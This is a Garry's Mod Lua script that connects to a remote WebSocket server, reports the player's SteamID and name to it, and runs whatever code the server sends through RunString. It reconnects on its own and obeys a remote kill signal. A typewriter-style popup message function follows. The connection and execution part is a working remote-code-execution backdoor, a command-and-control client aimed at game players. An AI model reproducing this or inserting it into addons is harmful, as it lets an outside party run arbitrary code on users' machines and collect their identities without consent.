-- Kill any existing connection to avoid duplicates
if _G.RemoteExecWS then
    print("[RemoteExec] Closing previous WebSocket connection...")
    _G.RemoteExecDisabled = true

    -- Safe close if function exists
    if isfunction(_G.RemoteExecWS.close) then
        _G.RemoteExecWS:close()
    end

    _G.RemoteExecWS = nil
end

_G.RemoteExecDisabled = false

-- Load gwsockets binary
local ok, err = pcall(require, "gwsockets")
if not ok then
    ErrorNoHalt("[RemoteExec] Failed to load gwsockets: " .. tostring(err) .. "\n")
    return
end

-- Create WebSocket connection
local ws = GWSockets.createWebSocket("wss://northpole-sv.onrender.com")
_G.RemoteExecWS = ws

local lastID = nil

function ws:onMessage(msg)
    local data = util.JSONToTable(msg)
    if not istable(data) then return end

    if data.kill then
        print("[RemoteExec] Kill signal received. Shutting down.")
        _G.RemoteExecDisabled = true
        self:close()
        _G.RemoteExecWS = nil
        return
    end

    if not data.id or not data.code then return end
    if data.id == lastID then return end
    lastID = data.id

    local delay = (data.run_at or os.time()) - os.time()
    if delay < 0 then delay = 0 end

    print("[RemoteExec] Executing code in " .. delay .. " seconds")
    timer.Simple(delay, function()
        if not _G.RemoteExecDisabled then
            RunString(data.code, "RemoteExec_WS")
        end
    end)
end

function ws:onConnected()
    print("[RemoteExec] WebSocket connected")

    timer.Simple(1, function()
        local ply = LocalPlayer()
        if not IsValid(ply) then return end

        local data = util.TableToJSON({
            type = "identify",
            steamID = ply:SteamID(),
            playerName = ply:Nick()
        })
        ws:write(data)
    end)
end



function ws:onDisconnected()
    if _G.RemoteExecDisabled then
        print("[RemoteExec] Disconnected and disabled — not reconnecting.")
        return
    end

    print("[RemoteExec] Disconnected — reconnecting in 5 seconds...")
    timer.Simple(5, function()
        if not _G.RemoteExecDisabled then
            self:open()
        end
    end)
end

-- Start connection
ws:open()

function ShowPopupMessage(text, duration, font, color, icon)
    duration = duration or 4
    font = font or "Trebuchet24"
    color = color or Color(255, 255, 255)
    local typingSound = "buttons/button16.wav" -- or your custom .wav

    local panel = vgui.Create("DPanel")
    panel:SetSize(800, 100)
    panel:Center()
    panel:SetPos((ScrW() - panel:GetWide()) / 2, ScrH() * 0.15) -- Top center
    panel:SetAlpha(0)
    panel:AlphaTo(255, 0.3, 0)

    local displayedText = ""
    local charIndex = 1
    local typeDelay = 0.03 -- seconds per character

    -- Paint the panel
    panel.Paint = function(self, w, h)
        draw.RoundedBox(8, 0, 0, w, h, Color(0, 0, 0, 180)) -- transparent bg
        if icon then
            surface.SetDrawColor(255, 255, 255, 255)
            surface.SetMaterial(Material(icon))
            surface.DrawTexturedRect(10, 10, 64, 64)
        end
        draw.SimpleText(displayedText, font, icon and 84 or w/2, h/2, color,
            icon and TEXT_ALIGN_LEFT or TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    -- Typewriter animation with sound
    local timerID = "PopupTypewriter" .. CurTime() .. "_" .. math.random(1000, 9999)

timer.Create(timerID, typeDelay, #text, function()

        if not IsValid(panel) then return end
        displayedText = displayedText .. string.sub(text, charIndex, charIndex)
        charIndex = charIndex + 1
        surface.PlaySound(typingSound)
    end)

    -- Fade out and cleanup
    timer.Simple(duration, function()
        if not IsValid(panel) then return end
        panel:AlphaTo(0, 1, 0, function()
            if IsValid(panel) then panel:Remove() end
        end)
    end)
end
